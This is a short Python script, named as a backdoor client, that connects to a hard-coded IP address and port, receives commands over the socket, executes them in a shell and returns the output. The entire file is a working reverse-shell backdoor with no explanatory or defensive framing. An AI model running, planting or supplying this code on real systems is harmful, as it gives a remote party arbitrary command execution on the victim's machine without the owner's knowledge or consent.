#!/usr/bin/python3

#########################################################################################
#   Client ... or something like that   
#########################################################################################

import socket
import subprocess

S_IP = "192.168.0.13"
S_PORT = 9091

class BackdoorN1F:
    def __init__(self, ip, port):
        self.connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connectto.connect((ip, port))

    def execute_sys_command(self,command):
        return subprocess.check_output(command, shell=True)

    def run_backdoor(self):
        while True:
            command = self.connectto.recv(1024)
            command_result = self.execute_sys_command(command)
            self.connectto.send(command_result)
        connectto.close()

if __name__ == "__main__":
    b = BackdoorN1F(S_IP, S_PORT)
    b.run_backdoor()
